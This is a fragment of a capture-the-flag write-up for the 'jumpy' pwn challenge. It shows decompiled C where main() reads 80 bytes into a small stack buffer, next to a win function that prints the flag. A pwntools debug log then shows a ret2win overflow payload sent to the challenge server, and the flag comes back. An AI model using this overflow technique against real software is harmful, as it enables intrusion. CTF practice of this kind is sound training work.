```language-c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+0h] [bp-10h]@1

  puts("Can you hack me?");
  fflush(_bss_start);
  read(0, &buf, 80uLL);
  return 0;
}

```


```language-c
int winrar()
{
  char buf; // [sp+0h] [bp-90h]@1
  int fd; // [sp+8Ch] [bp-4h]@1

  fd = open("flag", 0);
  read(fd, &buf, 0x80uLL);
  printf("Congrats! The flag is: %s", &buf);
  return fflush(_bss_start);
}

```


```lanuage-terminal

[*] '/home/kettle/git_repos/ctf.git/wcsc_ctf_2016/pwn/jumpy_200/jumpy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to wcscctf.org on port 8484: Done
[DEBUG] Received 0x11 bytes:
    'Can you hack me?\n'
Can you hack me?

[DEBUG] Sent 0x21 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  36 06 40 00  00 00 00 00  │aaaa│aaaa│6·@·│····│
    00000020  0a                                                  │·│
    00000021
[DEBUG] Received 0x37 bytes:
    'Congrats! The flag is:\n'
    'wcsc{64_b1ts_of_getting_there}\n'
    '\n'
Congrats! The flag is:
wcsc{64_b1ts_of_getting_there}


```
